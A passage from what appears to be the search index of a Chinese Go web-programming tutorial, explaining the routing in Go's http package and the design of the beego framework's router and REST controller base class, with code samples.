\u4e0a\u9762\u7684\u4f8b\u5b50\u8c03\u7528\u4e86http\u9ed8\u8ba4\u7684DefaultServeMux\u6765\u6dfb\u52a0\u8def\u7531\uff0c\u9700\u8981\u63d0\u4f9b\u4e24\u4e2a\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u5e0c\u671b\u7528\u6237\u8bbf\u95ee\u6b64\u8d44\u6e90\u7684URL\u8def\u5f84(\u4fdd\u5b58\u5728r.URL.Path)\uff0c\u7b2c\u4e8c\u53c2\u6570\u662f\u5373\u5c06\u8981\u6267\u884c\u7684\u51fd\u6570\uff0c\u4ee5\u63d0\u4f9b\u7528\u6237\u8bbf\u95ee\u7684\u8d44\u6e90\u3002\u8def\u7531\u7684\u601d\u8def\u4e3b\u8981\u96c6\u4e2d\u5728\u4e24\u70b9\uff1a</p> <ul> <li>\u6dfb\u52a0\u8def\u7531\u4fe1\u606f</li> <li>\u6839\u636e\u7528\u6237\u8bf7\u6c42\u8f6c\u53d1\u5230\u8981\u6267\u884c\u7684\u51fd\u6570</li> </ul> <p>Go\u9ed8\u8ba4\u7684\u8def\u7531\u6dfb\u52a0\u662f\u901a\u8fc7\u51fd\u6570<code>http.Handle</code>\u548c<code>http.HandleFunc</code>\u7b49\u6765\u6dfb\u52a0\uff0c\u5e95\u5c42\u90fd\u662f\u8c03\u7528\u4e86<code>DefaultServeMux.Handle(pattern string, handler Handler)</code>,\u8fd9\u4e2a\u51fd\u6570\u4f1a\u628a\u8def\u7531\u4fe1\u606f\u5b58\u50a8\u5728\u4e00\u4e2amap\u4fe1\u606f\u4e2d<code>map[string]muxEntry</code>\uff0c\u8fd9\u5c31\u89e3\u51b3\u4e86\u4e0a\u9762\u8bf4\u7684\u7b2c\u4e00\u70b9\u3002</p> <p>Go\u76d1\u542c\u7aef\u53e3\uff0c\u7136\u540e\u63a5\u6536\u5230tcp\u8fde\u63a5\u4f1a\u6254\u7ed9Handler\u6765\u5904\u7406\uff0c\u4e0a\u9762\u7684\u4f8b\u5b50\u9ed8\u8ba4nil\u5373\u4e3a<code>http.DefaultServeMux</code>\uff0c\u901a\u8fc7<code>DefaultServeMux.ServeHTTP</code>\u51fd\u6570\u6765\u8fdb\u884c\u8c03\u5ea6\uff0c\u904d\u5386\u4e4b\u524d\u5b58\u50a8\u7684map\u8def\u7531\u4fe1\u606f\uff0c\u548c\u7528\u6237\u8bbf\u95ee\u7684URL\u8fdb\u884c\u5339\u914d\uff0c\u4ee5\u67e5\u8be2\u5bf9\u5e94\u6ce8\u518c\u7684\u5904\u7406\u51fd\u6570\uff0c\u8fd9\u6837\u5c31\u5b9e\u73b0\u4e86\u4e0a\u9762\u6240\u8bf4\u7684\u7b2c\u4e8c\u70b9\u3002 <pre><code>for k, v := range mux.m {\nif !pathMatch(k, path) {\ncontinue\n}\nif h == nil || len(k) &gt; n {\nn = len(k)\nh = v.h\n}\n}\n</code></pre></p>"},{"location":"13.2/#beego","title":"beego\u6846\u67b6\u8def\u7531\u5b9e\u73b0","text":"<p>\u76ee\u524d\u51e0\u4e4e\u6240\u6709\u7684Web\u5e94\u7528\u8def\u7531\u5b9e\u73b0\u90fd\u662f\u57fa\u4e8ehttp\u9ed8\u8ba4\u7684\u8def\u7531\u5668\uff0c\u4f46\u662fGo\u81ea\u5e26\u7684\u8def\u7531\u5668\u6709\u51e0\u4e2a\u9650\u5236\uff1a</p> <ul> <li>\u4e0d\u652f\u6301\u53c2\u6570\u8bbe\u5b9a\uff0c\u4f8b\u5982/user/:uid \u8fd9\u79cd\u6cdb\u7c7b\u578b\u5339\u914d</li> <li>\u65e0\u6cd5\u5f88\u597d\u7684\u652f\u6301REST\u6a21\u5f0f\uff0c\u65e0\u6cd5\u9650\u5236\u8bbf\u95ee\u7684\u65b9\u6cd5\uff0c\u4f8b\u5982\u4e0a\u9762\u7684\u4f8b\u5b50\u4e2d\uff0c\u7528\u6237\u8bbf\u95ee/foo\uff0c\u53ef\u4ee5\u7528GET\u3001POST\u3001DELETE\u3001HEAD\u7b49\u65b9\u5f0f\u8bbf\u95ee</li> <li>\u4e00\u822c\u7f51\u7ad9\u7684\u8def\u7531\u89c4\u5219\u592a\u591a\u4e86\uff0c\u7f16\u5199\u7e41\u7410\u3002\u6211\u524d\u9762\u81ea\u5df1\u5f00\u53d1\u4e86\u4e00\u4e2aAPI\u5e94\u7528\uff0c\u8def\u7531\u89c4\u5219\u6709\u4e09\u5341\u51e0\u6761\uff0c\u8fd9\u79cd\u8def\u7531\u591a\u4e86\u4e4b\u540e\u5176\u5b9e\u53ef\u4ee5\u8fdb\u4e00\u6b65\u7b80\u5316\uff0c\u901a\u8fc7struct\u7684\u65b9\u6cd5\u8fdb\u884c\u4e00\u79cd\u7b80\u5316</li> </ul> <p>beego\u6846\u67b6\u7684\u8def\u7531\u5668\u57fa\u4e8e\u4e0a\u9762\u7684\u51e0\u70b9\u9650\u5236\u8003\u8651\u8bbe\u8ba1\u4e86\u4e00\u79cdREST\u65b9\u5f0f\u7684\u8def\u7531\u5b9e\u73b0\uff0c\u8def\u7531\u8bbe\u8ba1\u4e5f\u662f\u57fa\u4e8e\u4e0a\u9762Go\u9ed8\u8ba4\u8bbe\u8ba1\u7684\u4e24\u70b9\u6765\u8003\u8651\uff1a\u5b58\u50a8\u8def\u7531\u548c\u8f6c\u53d1\u8def\u7531</p>"},{"location":"13.2/#_2","title":"\u5b58\u50a8\u8def\u7531","text":"<p>\u9488\u5bf9\u524d\u9762\u6240\u8bf4\u7684\u9650\u5236\u70b9\uff0c\u6211\u4eec\u9996\u5148\u8981\u89e3\u51b3\u53c2\u6570\u652f\u6301\u5c31\u9700\u8981\u7528\u5230\u6b63\u5219\uff0c\u7b2c\u4e8c\u548c\u7b2c\u4e09\u70b9\u6211\u4eec\u901a\u8fc7\u4e00\u79cd\u53d8\u901a\u7684\u65b9\u6cd5\u6765\u89e3\u51b3\uff0cREST\u7684\u65b9\u6cd5\u5bf9\u5e94\u5230struct\u7684\u65b9\u6cd5\u4e2d\u53bb\uff0c\u7136\u540e\u8def\u7531\u5230struct\u800c\u4e0d\u662f\u51fd\u6570\uff0c\u8fd9\u6837\u5728\u8f6c\u53d1\u8def\u7531\u7684\u65f6\u5019\u5c31\u53ef\u4ee5\u6839\u636emethod\u6765\u6267\u884c\u4e0d\u540c\u7684\u65b9\u6cd5\u3002</p> <p>\u6839\u636e\u4e0a\u9762\u7684\u601d\u8def\uff0c\u6211\u4eec\u8bbe\u8ba1\u4e86\u4e24\u4e2a\u6570\u636e\u7c7b\u578bcontrollerInfo(\u4fdd\u5b58\u8def\u5f84\u548c\u5bf9\u5e94\u7684struct\uff0c\u8fd9\u91cc\u662f\u4e00\u4e2areflect.Type\u7c7b\u578b)\u548cControllerRegistor(routers\u662f\u4e00\u4e2aslice\u7528\u6765\u4fdd\u5b58\u7528\u6237\u6dfb\u52a0\u7684\u8def\u7531\u4fe1\u606f\uff0c\u4ee5\u53cabeego\u6846\u67b6\u7684\u5e94\u7528\u4fe1\u606f) <pre><code>type controllerInfo struct {\nregex          *regexp.Regexp\nparams         map[int]string\ncontrollerType reflect.Type\n}\n\ntype ControllerRegistor struct {\nrouters     []*controllerInfo\nApplication *App\n}\n</code></pre> ControllerRegistor\u5bf9\u5916\u7684\u63a5\u53e3\u51fd\u6570\u6709 <pre><code>func (p *ControllerRegistor) Add(pattern string, c ControllerInterface)\n</code></pre> \u8be6\u7ec6\u7684\u5b9e\u73b0\u5982\u4e0b\u6240\u793a\uff1a <pre><code>func (p *ControllerRegistor) Add(pattern string, c ControllerInterface) {\nparts := strings.Split(pattern, \"/\")\n\nj := 0\nparams := make(map[int]string)\nfor i, part := range parts {\nif strings.HasPrefix(part, \":\") {\nexpr := \"([^/]+)\"\n\n//a user may choose to override the defult expression\n// similar to expressjs: \u2018/user/:id([0-9]+)\u2019\n\nif index := strings.Index(part, \"(\"); index != -1 {\nexpr = part[index:]\npart = part[:index]\n}\nparams[j] = part\nparts[i] = expr\nj++\n}\n}\n\n//recreate the url pattern, with parameters replaced\n//by regular expressions. then compile the regex\n\npattern = strings.Join(parts, \"/\")\nregex, regexErr := regexp.Compile(pattern)\nif regexErr != nil {\n\n//TODO add error handling here to avoid panic\npanic(regexErr)\nreturn\n}\n\n//now create the Route\nt := reflect.Indirect(reflect.ValueOf(c)).Type()\nroute := &amp;controllerInfo{}\nroute.regex = regex\nroute.params = params\nroute.controllerType = t\n\np.routers = append(p.routers, route)\n\n}\n</code></pre></p>"},{"location":"13.2/#_3","title":"\u9759\u6001\u8def\u7531\u5b9e\u73b0","text":"<p>\u4e0a\u9762\u6211\u4eec\u5b9e\u73b0\u7684\u52a8\u6001\u8def\u7531\u7684\u5b9e\u73b0\uff0cGo\u7684http\u5305\u9ed8\u8ba4\u652f\u6301\u9759\u6001\u6587\u4ef6\u5904\u7406FileServer\uff0c\u7531\u4e8e\u6211\u4eec\u5b9e\u73b0\u4e86\u81ea\u5b9a\u4e49\u7684\u8def\u7531\u5668\uff0c\u90a3\u4e48\u9759\u6001\u6587\u4ef6\u4e5f\u9700\u8981\u81ea\u5df1\u8bbe\u5b9a\uff0cbeego\u7684\u9759\u6001\u6587\u4ef6\u5939\u8def\u5f84\u4fdd\u5b58\u5728\u5168\u5c40\u53d8\u91cfStaticDir\u4e2d\uff0cStaticDir\u662f\u4e00\u4e2amap\u7c7b\u578b\uff0c\u5b9e\u73b0\u5982\u4e0b\uff1a <pre><code>func (app *App) SetStaticPath(url string, path string) *App {\nStaticDir[url] = path\nreturn app\n}\n</code></pre> \u5e94\u7528\u4e2d\u8bbe\u7f6e\u9759\u6001\u8def\u5f84\u53ef\u4ee5\u4f7f\u7528\u5982\u4e0b\u65b9\u5f0f\u5b9e\u73b0\uff1a <pre><code>beego.SetStaticPath(\"/img\",\"/static/img\")\n</code></pre></p>"},{"location":"13.2/#_4","title":"\u8f6c\u53d1\u8def\u7531","text":"<p>\u8f6c\u53d1\u8def\u7531\u662f\u57fa\u4e8eControllerRegistor\u91cc\u7684\u8def\u7531\u4fe1\u606f\u6765\u8fdb\u884c\u8f6c\u53d1\u7684\uff0c\u8be6\u7ec6\u7684\u5b9e\u73b0\u5982\u4e0b\u4ee3\u7801\u6240\u793a\uff1a <pre><code>// AutoRoute\nfunc (p *ControllerRegistor) ServeHTTP(w http.ResponseWriter, r *http.Request) {\ndefer func() {\nif err := recover(); err != nil {\nif !RecoverPanic {\n// go back to panic\npanic(err)\n} else {\nCritical(\"Handler crashed with error\", err)\nfor i := 1; ; i += 1 {\n_, file, line, ok := runtime.Caller(i)\nif !ok {\nbreak\n}\nCritical(file, line)\n}\n}\n}\n}()\nvar started bool\nfor prefix, staticDir := range StaticDir {\nif strings.HasPrefix(r.URL.Path, prefix) {\nfile := staticDir + r.URL.Path[len(prefix):]\nhttp.ServeFile(w, r, file)\nstarted = true\nreturn\n}\n}\nrequestPath := r.URL.Path\n\n//find a matching Route\nfor _, route := range p.routers {\n\n//check if Route pattern matches url\nif !route.regex.MatchString(requestPath) {\ncontinue\n}\n\n//get submatches (params)\nmatches := route.regex.FindStringSubmatch(requestPath)\n\n//double check that the Route matches the URL pattern.\nif len(matches[0]) != len(requestPath) {\ncontinue\n}\n\nparams := make(map[string]string)\nif len(route.params) &gt; 0 {\n//add url parameters to the query param map\nvalues := r.URL.Query()\nfor i, match := range matches[1:] {\nvalues.Add(route.params[i], match)\nparams[route.params[i]] = match\n}\n\n//reassemble query params and add to RawQuery\nr.URL.RawQuery = url.Values(values).Encode() + \"&amp;\" + r.URL.RawQuery\n//r.URL.RawQuery = url.Values(values).Encode()\n}\n//Invoke the request handler\nvc := reflect.New(route.controllerType)\ninit := vc.MethodByName(\"Init\")\nin := make([]reflect.Value, 2)\nct := &amp;Context{ResponseWriter: w, Request: r, Params: params}\nin[0] = reflect.ValueOf(ct)\nin[1] = reflect.ValueOf(route.controllerType.Name())\ninit.Call(in)\nin = make([]reflect.Value, 0)\nmethod := vc.MethodByName(\"Prepare\")\nmethod.Call(in)\nif r.Method == \"GET\" {\nmethod = vc.MethodByName(\"Get\")\nmethod.Call(in)\n} else if r.Method == \"POST\" {\nmethod = vc.MethodByName(\"Post\")\nmethod.Call(in)\n} else if r.Method == \"HEAD\" {\nmethod = vc.MethodByName(\"Head\")\nmethod.Call(in)\n} else if r.Method == \"DELETE\" {\nmethod = vc.MethodByName(\"Delete\")\nmethod.Call(in)\n} else if r.Method == \"PUT\" {\nmethod = vc.MethodByName(\"Put\")\nmethod.Call(in)\n} else if r.Method == \"PATCH\" {\nmethod = vc.MethodByName(\"Patch\")\nmethod.Call(in)\n} else if r.Method == \"OPTIONS\" {\nmethod = vc.MethodByName(\"Options\")\nmethod.Call(in)\n}\nif AutoRender {\nmethod = vc.MethodByName(\"Render\")\nmethod.Call(in)\n}\nmethod = vc.MethodByName(\"Finish\")\nmethod.Call(in)\nstarted = true\nbreak\n}\n\n//if no matches to url, throw a not found exception\nif started == false {\nhttp.NotFound(w, r)\n}\n}\n</code></pre></p>"},{"location":"13.2/#_5","title":"\u4f7f\u7528\u5165\u95e8","text":"<p>\u57fa\u4e8e\u8fd9\u6837\u7684\u8def\u7531\u8bbe\u8ba1\u4e4b\u540e\u5c31\u53ef\u4ee5\u89e3\u51b3\u524d\u9762\u6240\u8bf4\u7684\u4e09\u4e2a\u9650\u5236\u70b9\uff0c\u4f7f\u7528\u7684\u65b9\u5f0f\u5982\u4e0b\u6240\u793a\uff1a</p> <p>\u57fa\u672c\u7684\u4f7f\u7528\u6ce8\u518c\u8def\u7531\uff1a <pre><code>beego.BeeApp.RegisterController(\"/\", &amp;controllers.MainController{})\n</code></pre> \u53c2\u6570\u6ce8\u518c\uff1a <pre><code>beego.BeeApp.RegisterController(\"/:param\", &amp;controllers.UserController{})\n</code></pre> \u6b63\u5219\u5339\u914d\uff1a <pre><code>beego.BeeApp.RegisterController(\"/users/:uid([0-9]+)\", &amp;controllers.UserController{})\n</code></pre></p>"},{"location":"13.2/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u7ae0: \u9879\u76ee\u89c4\u5212</li> <li>\u4e0b\u4e00\u8282: controller\u8bbe\u8ba1</li> </ul>"},{"location":"13.3/","title":"13.3 controller\u8bbe\u8ba1","text":""},{"location":"13.3/#133-controller","title":"13.3 controller\u8bbe\u8ba1","text":"<p>\u4f20\u7edf\u7684MVC\u6846\u67b6\u5927\u591a\u6570\u662f\u57fa\u4e8eAction\u8bbe\u8ba1\u7684\u540e\u7f00\u5f0f\u6620\u5c04\uff0c\u7136\u800c\uff0c\u73b0\u5728Web\u6d41\u884cREST\u98ce\u683c\u7684\u67b6\u6784\u3002\u5c3d\u7ba1\u4f7f\u7528Filter\u6216\u8005rewrite\u80fd\u591f\u901a\u8fc7URL\u91cd\u5199\u5b9e\u73b0REST\u98ce\u683c\u7684URL\uff0c\u4f46\u662f\u4e3a\u4ec0\u4e48\u4e0d\u76f4\u63a5\u8bbe\u8ba1\u4e00\u4e2a\u5168\u65b0\u7684REST\u98ce\u683c\u7684 MVC\u6846\u67b6\u5462\uff1f\u672c\u5c0f\u8282\u5c31\u662f\u57fa\u4e8e\u8fd9\u79cd\u601d\u8def\u6765\u8bb2\u8ff0\u5982\u4f55\u4ece\u5934\u8bbe\u8ba1\u4e00\u4e2a\u57fa\u4e8eREST\u98ce\u683c\u7684MVC\u6846\u67b6\u4e2d\u7684controller\uff0c\u6700\u5927\u9650\u5ea6\u5730\u7b80\u5316Web\u5e94\u7528\u7684\u5f00\u53d1\uff0c\u751a\u81f3\u7f16\u5199\u4e00\u884c\u4ee3\u7801\u5c31\u53ef\u4ee5\u5b9e\u73b0\u201cHello, world\u201d\u3002</p>"},{"location":"13.3/#controller","title":"controller\u4f5c\u7528","text":"<p>MVC\u8bbe\u8ba1\u6a21\u5f0f\u662f\u76ee\u524dWeb\u5e94\u7528\u5f00\u53d1\u4e2d\u6700\u5e38\u89c1\u7684\u67b6\u6784\u6a21\u5f0f\uff0c\u901a\u8fc7\u5206\u79bb Model\uff08\u6a21\u578b\uff09\u3001View\uff08\u89c6\u56fe\uff09\u548c Controller\uff08\u63a7\u5236\u5668\uff09\uff0c\u53ef\u4ee5\u66f4\u5bb9\u6613\u5b9e\u73b0\u6613\u4e8e\u6269\u5c55\u7684\u7528\u6237\u754c\u9762(UI)\u3002Model\u6307\u540e\u53f0\u8fd4\u56de\u7684\u6570\u636e\uff1bView\u6307\u9700\u8981\u6e32\u67d3\u7684\u9875\u9762\uff0c\u901a\u5e38\u662f\u6a21\u677f\u9875\u9762\uff0c\u6e32\u67d3\u540e\u7684\u5185\u5bb9\u901a\u5e38\u662fHTML\uff1bController\u6307Web\u5f00\u53d1\u4eba\u5458\u7f16\u5199\u7684\u5904\u7406\u4e0d\u540cURL\u7684\u63a7\u5236\u5668\uff0c\u5982\u524d\u9762\u5c0f\u8282\u8bb2\u8ff0\u7684\u8def\u7531\u5c31\u662fURL\u8bf7\u6c42\u8f6c\u53d1\u5230\u63a7\u5236\u5668\u7684\u8fc7\u7a0b\uff0ccontroller\u5728\u6574\u4e2a\u7684MVC\u6846\u67b6\u4e2d\u8d77\u5230\u4e86\u4e00\u4e2a\u6838\u5fc3\u7684\u4f5c\u7528\uff0c\u8d1f\u8d23\u5904\u7406\u4e1a\u52a1\u903b\u8f91\uff0c\u56e0\u6b64\u63a7\u5236\u5668\u662f\u6574\u4e2a\u6846\u67b6\u4e2d\u5fc5\u4e0d\u53ef\u5c11\u7684\u4e00\u90e8\u5206\uff0cModel\u548cView\u5bf9\u4e8e\u6709\u4e9b\u4e1a\u52a1\u9700\u6c42\u662f\u53ef\u4ee5\u4e0d\u5199\u7684\uff0c\u4f8b\u5982\u6ca1\u6709\u6570\u636e\u5904\u7406\u7684\u903b\u8f91\u5904\u7406\uff0c\u6ca1\u6709\u9875\u9762\u8f93\u51fa\u7684302\u8c03\u6574\u4e4b\u7c7b\u7684\u5c31\u4e0d\u9700\u8981Model\u548cView\uff0c\u4f46\u662fcontroller\u8fd9\u4e00\u73af\u8282\u662f\u5fc5\u4e0d\u53ef\u5c11\u7684\u3002</p>"},{"location":"13.3/#beegorest","title":"beego\u7684REST\u8bbe\u8ba1","text":"<p>\u524d\u9762\u5c0f\u8282\u4ecb\u7ecd\u4e86\u8def\u7531\u5b9e\u73b0\u4e86\u6ce8\u518cstruct\u7684\u529f\u80fd\uff0c\u800cstruct\u4e2d\u5b9e\u73b0\u4e86REST\u65b9\u5f0f\uff0c\u56e0\u6b64\u6211\u4eec\u9700\u8981\u8bbe\u8ba1\u4e00\u4e2a\u7528\u4e8e\u903b\u8f91\u5904\u7406controller\u7684\u57fa\u7c7b\uff0c\u8fd9\u91cc\u4e3b\u8981\u8bbe\u8ba1\u4e86\u4e24\u4e2a\u7c7b\u578b\uff0c\u4e00\u4e2astruct\u3001\u4e00\u4e2ainterface <pre><code>type Controller struct {\nCt        *Context\nTpl       *template.Template\nData      map[interface{}]interface{}\nChildName string\nTplNames  string\nLayout    []string\nTplExt    string\n}\n\ntype ControllerInterface interface {\nInit(ct *Context, cn string)    //\u521d\u59cb\u5316\u4e0a\u4e0b\u6587\u548c\u5b50\u7c7b\u540d\u79f0\nPrepare()                       //\u5f00\u59cb\u6267\u884c\u4e4b\u524d\u7684\u4e00\u4e9b\u5904\u7406\nGet()                           //method=GET\u7684\u5904\u7406\nPost()                          //method=POST\u7684\u5904\u7406\nDelete()                        //method=DELETE\u7684\u5904\u7406\nPut()                           //method=PUT\u7684\u5904\u7406\nHead()                          //method=HEAD\u7684\u5904\u7406\nPatch()                         //method=PATCH\u7684\u5904\u7406\nOptions()                       //method=OPTIONS\u7684\u5904\u7406\nFinish()                        //\u6267\u884c\u5b8c\u6210\u4e4b\u540e\u7684\u5904\u7406     \nRender() error                  //\u6267\u884c\u5b8cmethod\u5bf9\u5e94\u7684\u65b9\u6cd5\u4e4b\u540e\u6e32\u67d3\u9875\u9762\n}\n</code></pre> \u90a3\u4e48\u524d\u9762\u4ecb\u7ecd\u7684\u8def\u7531add\u51fd\u6570\u7684\u65f6\u5019\u662f\u5b9a\u4e49\u4e86ControllerInterface\u7c7b\u578b\uff0c\u56e0\u6b64\uff0c\u53ea\u8981\u6211\u4eec\u5b9e\u73b0\u8fd9\u4e2a\u63a5\u53e3\u5c31\u53ef\u4ee5\uff0c\u6240\u4ee5\u6211\u4eec\u7684\u57fa\u7c7bController\u5b9e\u73b0\u5982\u4e0b\u7684\u65b9\u6cd5\uff1a <pre><code>func (c *Controller) Init(ct *Context, cn string) {\nc.Data = make(map[interface{}]interface{})\nc.Layout = make([]string, 0)\nc.TplNames = \"\"\nc.ChildName = cn\nc.Ct = ct\nc.TplExt = \"tpl\"\n}\n\nfunc (c *Controller) Prepare() {\n\n}\n\nfunc (c *Controller) Finish() {\n\n}\n\nfunc (c *Controller) Get() {\nhttp.Error(c.Ct.ResponseWriter, \"Method Not Allowed\", 405)\n}\n\nfunc (c *Controller) Post() {\nhttp.Error(c.Ct.ResponseWriter, \"Method Not Allowed\", 405)\n}\n\nfunc (c *Controller) Delete() {\nhttp.Error(c.Ct.ResponseWriter, \"Method Not Allowed\", 405)\n}\n\nfunc (c *Controller) Put() {\nhttp.Error(c.Ct.ResponseWriter, \"Method Not Allowed\", 405)\n}\n\nfunc (c *Controller) Head() {\nhttp.Error(c.Ct.ResponseWriter, \"Method Not Allowed\", 405)\n}\n\nfunc (c *Controller) Patch() {\nhttp.Error(c.Ct.ResponseWriter, \"Method Not Allowed\", 405)\n}\n\nfunc (c *Controller) Options() {\nhttp.Error(c.Ct.ResponseWriter, \"Method Not Allowed\", 405)\n}\n\nfunc (c *Controller) Render() error {\nif len(c.Layout) &gt; 0 {\nvar filenames []string\nfor _, file := range c.Layout {\nfilenames = append(filenames, path.Join(ViewsPath, file))\n}\nt, err := template.ParseFiles(filenames...)\nif err != nil {\nTrace(\"template ParseFiles err:\", err)\n}\nerr = t.ExecuteTemplate(c.Ct.ResponseWriter, c.TplNames, c.Data)\nif err != nil {\nTrace(\"template Execute err:\", err)\n}\n} else {\nif c.TplNames == \"\" {\nc.TplNames = c.ChildName + \"/\" + c.Ct.Request.Method + \".\" + c.TplExt\n}\nt, err := template.ParseFiles(path.Join(ViewsPath, c.TplNames))\nif err != nil {\nTrace(\"template ParseFiles err:\", err)\n}\nerr = t.Execute(c.Ct.ResponseWriter, c.Data)\nif err != nil {\nTrace(\"template Execute err:\", err)\n}\n}\nreturn nil\n}\n\nfunc (c *Controller) Redirect(url string, code int) {\nc.Ct.Redirect(code, url)\n}\n</code></pre> \u4e0a\u9762\u7684controller\u57fa\u7c7b\u5df2\u7ecf\u5b9e\u73b0\u4e86\u63a5\u53e3\u5b9a\u4e49\u7684\u51fd\u6570\uff0c\u901a\u8fc7\u8def\u7531\u6839\u636eurl\u6267\u884c\u76f8\u5e94\u7684controller\u7684\u539f\u5219\uff0c\u4f1a\u4f9d\u6b21\u6267\u884c\u5982\u4e0b\uff1a <pre><code>Init()      \u521d\u59cb\u5316\nPrepare()   \u6267\u884c\u4e4b\u524d\u7684\u521d\u59cb\u5316\uff0c\u6bcf\u4e2a\u7ee7\u627f\u7684\u5b50\u7c7b\u53ef\u4ee5\u6765\u5b9e\u73b0\u8be5\u51fd\u6570\nmethod()    \u6839\u636e\u4e0d\u540c\u7684method\u6267\u884c\u4e0d\u540c\u7684\u51fd\u6570\uff1aGET\u3001POST\u3001PUT\u3001HEAD\u7b49\uff0c\u5b50\u7c7b\u6765\u5b9e\u73b0\u8fd9\u4e9b\u51fd\u6570\uff0c\u5982\u679c\u6ca1\u5b9e\u73b0\uff0c\u90a3\u4e48\u9ed8\u8ba4\u90fd\u662f403\nRender()    \u53ef\u9009\uff0c\u6839\u636e\u5168\u5c40\u53d8\u91cfAutoRender\u6765\u5224\u65ad\u662f\u5426\u6267\u884c\nFinish()    \u6267\u884c\u5b8c\u4e4b\u540e\u6267\u884c\u7684\u64cd\u4f5c\uff0c\u6bcf\u4e2a\u7ee7\u627f\u7684\u5b50\u7c7b\u53ef\u4ee5\u6765\u5b9e\u73b0\u8be5\u51fd\u6570\n</code></pre></p>"},{"location":"13.3/#_1","title":"\u5e94\u7528\u6307\u5357","text":"<p>\u4e0a\u9762beego\u6846\u67b6\u4e2d\u5b8c\u6210\u4e86controller\u57fa\u7c7b\u7684\u8bbe\u8ba1\uff0c\u90a3\u4e48\u6211\u4eec\u5728\u6211\u4eec\u7684\u5e94\u7528\u4e2d\u53ef\u4ee5\u8fd9\u6837\u6765\u8bbe\u8ba1\u6211\u4eec\u7684\u65b9\u6cd5\uff1a <pre><code>package controllers\n\nimport (\n\"github.com/astaxie/beego\"\n)\n\ntype MainController struct {\nbeego.Controller\n}\n\nfunc (this *MainController) Get() {\nthis.Data[\"Username\"] = \"astaxie\"\nthis.Data[\"Email\"] = \"astaxie@gmail.com\"\nthis.TplNames = \"index.tpl\"\n}\n</code></pre> \u4e0a\u9762\u7684\u65b9\u5f0f\u6211\u4eec\u5b9e\u73b0\u4e86\u5b50\u7c7bMainController\uff0c\u5b9e\u73b0\u4e86Get\u65b9\u6cd5\uff0c\u90a3\u4e48\u5982\u679c\u7528\u6237\u901a\u8fc7\u5176\u4ed6\u7684\u65b9\u5f0f(POST/HEAD\u7b49)\u6765\u8bbf\u95ee\u8be5\u8d44\u6e90\u90fd\u5c06\u8fd4\u56de405\uff0c\u800c\u5982\u679c\u662fGet\u6765\u8bbf\u95ee\uff0c\u56e0\u4e3a\u6211\u4eec\u8bbe\u7f6e\u4e86AutoRender=true\uff0c\u90a3\u4e48\u5728\u6267\u884c\u5b8cGet\u65b9\u6cd5\u4e4b\u540e\u4f1a\u81ea\u52a8\u6267\u884cRender\u51fd\u6570\uff0c\u5c31\u4f1a\u663e\u793a\u5982\u4e0b\u754c\u9762\uff1a</p> <p></p> <p>index.tpl\u7684\u4ee3\u7801\u5982\u4e0b\u6240\u793a\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u6570\u636e\u7684\u8bbe\u7f6e\u548c\u663e\u793a\u90fd\u662f\u76f8\u5f53\u7684\u7b80\u5355\u65b9\u4fbf\uff1a <pre><code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n  &lt;head&gt;\n    &lt;title&gt;beego welcome template&lt;/title&gt;\n  &lt;/head&gt;\n  &lt;body&gt;\n    &lt;h1&gt;Hello, world!{{.Username}},{{.Email}}&lt;/h1&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre></p>"},{"location":"13.3/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u7ae0: \u81ea\u5b9a\u4e49\u8def\u7531\u5668\u8bbe\u8ba1</li> <li>\u4e0b\u4e00\u8282: \u65e5\u5fd7\u548c\u914d\u7f6e\u8bbe\u8ba1</li> </ul>"},{"location":"13.4/","title":"13.4 \u65e5\u5fd7\u548c\u914d\u7f6e\u8bbe\u8ba1","text":""},{"location":"13.4/#_1","title":"\u65e5\u5fd7\u548c\u914d\u7f6e\u7684\u91cd\u8981\u6027","text":"<p>\u524d\u9762\u5df2\u7ecf\u4ecb\u7ecd\u8fc7\u65e5\u5fd7\u5728\u6211\u4eec\u7a0b\u5e8f\u5f00\u53d1\u4e2d\u8d77\u7740\u5f88\u91cd\u8981\u7684\u4f5c\u7528\uff0c\u901a\u8fc7\u65e5\u5fd7\u6211\u4eec\u53ef\u4ee5\u8bb0\u5f55\u8c03\u8bd5\u6211\u4eec\u7684\u4fe1\u606f\uff0c\u5f53\u521d\u4ecb\u7ecd\u8fc7\u4e00\u4e2a\u65e5\u5fd7\u7cfb\u7edfseelog\uff0c\u6839\u636e\u4e0d\u540c\u7684level\u8f93\u51fa\u4e0d\u540c\u7684\u65e5\u5fd7\uff0c\u8fd9\u4e2a\u5bf9\u4e8e\u7a0b\u5e8f\u5f00\u53d1\u548c\u7a0b\u5e8f\u90e8\u7f72\u6765\u8bf4\u81f3\u5173\u91cd\u8981\u3002\u6211\u4eec\u53ef\u4ee5\u5728\u7a0b\u5e8f\u5f00\u53d1\u4e2d\u8bbe\u7f6elevel\u4f4e\u4e00\u70b9\uff0c\u90e8\u7f72\u7684\u65f6\u5019\u628alevel\u8bbe\u7f6e\u9ad8\uff0c\u8fd9\u6837\u6211\u4eec\u5f00\u53d1\u4e2d\u7684\u8c03\u8bd5\u4fe1\u606f\u53ef\u4ee5\u5c4f\u853d\u6389\u3002</p> <p>\u914d\u7f6e\u6a21\u5757\u5bf9\u4e8e\u5e94\u7528\u90e8\u7f72\u7275\u6d89\u5230\u670d\u52a1\u5668\u4e0d\u540c\u7684\u4e00\u4e9b\u914d\u7f6e\u4fe1\u606f\u975e\u5e38\u6709\u7528\uff0c\u4f8b\u5982\u4e00\u4e9b\u6570\u636e\u5e93\u914d\u7f6e\u4fe1\u606f\u3001\u76d1\u542c\u7aef\u53e3\u3001\u76d1\u542c\u5730\u5740\u7b49\u90fd\u662f\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e\u6587\u4ef6\u6765\u914d\u7f6e\uff0c\u8fd9\u6837\u6211\u4eec\u7684\u5e94\u7528\u7a0b\u5e8f\u5c31\u5177\u6709\u5f88\u5f3a\u7684\u7075\u6d3b\u6027\uff0c\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e\u6587\u4ef6\u7684\u914d\u7f6e\u90e8\u7f72\u5728\u4e0d\u540c\u7684\u673a\u5668\u4e0a\uff0c\u53ef\u4ee5\u8fde\u63a5\u4e0d\u540c\u7684\u6570\u636e\u5e93\u4e4b\u7c7b\u7684\u3002</p>"